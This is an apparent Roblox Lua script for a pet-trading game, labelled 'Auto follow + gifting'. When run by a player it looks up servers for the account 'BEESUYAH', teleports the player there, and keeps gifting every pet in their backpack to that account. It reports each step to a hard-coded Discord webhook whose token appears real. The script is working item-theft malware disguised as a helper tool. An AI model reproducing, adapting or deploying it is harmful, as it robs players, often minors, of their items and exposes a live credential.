local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local PlaceId = game.PlaceId
local UsernameList = {"BEESUYAH"}
local Webhook = "https://discord.com/api/webhooks/1406162216247623792/DdZdihmGWBrJQxh5l97gKP3p_21wCtHL5kDfwPoKPs7qt5Kss3uJByOtQdmsd_GPRROH"
local maxAttempts = 50
local waitTimeBetweenRequests = 1

local function SendWebhook(msg)
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode({content=msg})
        })
    end)
end

local function FindTargetServer()
    local page = 0
    while page < maxAttempts do
        local success, body = pcall(function()
            local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",PlaceId,page>0 and tostring(page) or "")
            local res = game:HttpGet(url)
            return HttpService:JSONDecode(res)
        end)
        if success and body and body.data then
            for _, server in ipairs(body.data) do
                for _, name in ipairs(UsernameList) do
                    for _, playerData in ipairs(server.players) do
                        if playerData.name == name then
                            SendWebhook("Found target "..name.." in server: "..server.id)
                            return server.id
                        end
                    end
                end
            end
        end
        page = page + 1
        task.wait(waitTimeBetweenRequests)
    end
    return nil
end

local function TeleportToServer(jobId)
    if not jobId then return end
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(PlaceId, jobId, Players.LocalPlayer)
    end)
    if not success then
        warn("Teleport failed: "..tostring(err))
        SendWebhook("Teleport failed: "..tostring(err))
    else
        SendWebhook("Teleporting to server "..jobId.."...")
    end
end

task.spawn(function()
    while true do
        local targetServer = FindTargetServer()
        if targetServer then
            TeleportToServer(targetServer)
            break
        else
            SendWebhook("Target player not found, retrying in 10s...")
            task.wait(10)
        end
    end
end)

local function WaitForPlayers()
    local receiverPlr
    repeat
        for _, name in ipairs(UsernameList) do
            receiverPlr = Players:FindFirstChild(name)
            if receiverPlr then break end
        end
        task.wait(1)
    until receiverPlr
    return receiverPlr
end

local receiver = WaitForPlayers()
local target = Players.LocalPlayer

local function SafeFollow()
    local conn
    conn = RunService.Stepped:Connect(function()
        if receiver.Character and target.Character then
            local targetRoot = receiver.Character:FindFirstChild("HumanoidRootPart")
            local followerRoot = target.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot and followerRoot then
                followerRoot.CFrame = targetRoot.CFrame * CFrame.new(0,0,0.5)
            end
        end
    end)
    return {Stop=function() if conn then conn:Disconnect() end end}
end

SafeFollow()

local function SafeGiftTool(tool)
    if not receiver.Character or not target.Character then return false end
    local humanoid = target.Character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    humanoid:EquipTool(tool)
    task.wait(0.5)
    local success, err = pcall(function()
        ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", receiver)
    end)
    if not success then
        warn("Gift failed:", err)
        SendWebhook("Gift failed: "..tostring(err))
        return false
    end
    task.wait(0.5)
    SendWebhook("Gifted "..tool.Name.." to "..receiver.Name)
    return true
end

task.spawn(function()
    while true do
        for _, tool in ipairs(target.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool:GetAttribute("ItemType")=="Pet" then
                SafeGiftTool(tool)
            end
        end
        task.wait(5)
    end
end)

SendWebhook("Auto follow + gifting initialized ✅")
print("Auto follow + gifting running ✅")
